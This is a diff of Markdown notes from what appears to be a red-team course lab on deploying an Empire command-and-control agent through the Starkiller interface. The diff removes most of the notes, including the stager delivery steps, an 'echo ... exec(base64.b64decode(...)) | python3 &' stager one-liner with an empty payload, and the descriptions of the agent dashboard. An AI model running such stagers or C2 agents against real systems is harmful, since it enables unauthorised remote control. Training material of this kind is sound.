@@ -84,46 +84,21 @@ cd /opt/starkiller/
 ![[Pasted image 20240123202431.png]]
 
 ### Deliver Stager - Execute the stager to create an Agent on your Slingshot Linux VM
-1. **Deliver** your stager to Slingshot Linux. On the Stagers dashboard, click the three vertical dots icon under actions to bring up the actions menu. Click Copy to Clipboard.
-2. **Execute:** Open up a new terminal window as the user sec565 and enter Ctrl+Shift+v to paste the stager code. You can see here that we are echoing python code into python3. The stager is base64 encoded by default.
-3. **Callback:** Press enter and a subprocess will be created, Empire will receive a web request and a new agent will be registered with the C2.
+1. 
 
-![[Pasted image 20240123204357.png]]
-
-`echo "import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode(''));" | python3 &`
 ### Agent Interaction - Ensure communication works properly 
 
-1. Click on the chain icon on the left navigation window to bring up the Agents dashboard. Your new agent will get assigned a randomly generated name. On the dashboard you will see important information about your agent:
-	- The Name column is a randomly generated name assigned by Empire, you can and should change this name to something that is easy to recognize.
-	- The Last Seen column will show how long it has been since the agent last checked in. This value may indicate if the agent is still alive or not. The check-in intervals are determined by the Delay and Jitter.
-	- The First Seen column will display the time since the agent first registered with the C2 server.
-	- The Hostname column displays the internal hostname of the system the agent is running on.
-	- The Process column shows which process the agent is currently running in.
-	- The Architecture column shows the CPU architecture of the target, this is significant for additional targeting. Exploits and tools must be matched to the appropriate CPU architecture.
-	- The Language column shows the type code the agent is executing. PowerShell or Python.
-	- The Username column shows the current user context the agent is running under.
-	- The Internal IP column will usually display the private IP address of the target.
-
-Click on the agent's name to interact with the agent.
-![[Pasted image 20240128122145.png]]
 
 ### Modules 
-Click on the six square icon on the left navigation window to bring up the Modules dashboard. This page will display all the loaded modules along with their characteristics and mapping to MITRE ATT&CK Techniques. 
-![[Pasted image 20240128233317.png]]
 
 
 ## Research | Bonus
-
-[Empire: Empire is a post-exploitation and adversary emulation framework](https://github.com/BC-SECURITY/Empire)
-
-
-[Starkiller: Starkiller is a Frontend for PowerShell Empire.](https://github.com/BC-SECURITY/Starkiller)
 
 
 [Malleable-C2-Profiles](https://github.com/BC-SECURITY/Malleable-C2-Profiles)
 
 #### Malleable C2 Profile
-
+1. 
 
 #### Network Footprinting
 Lessons learned
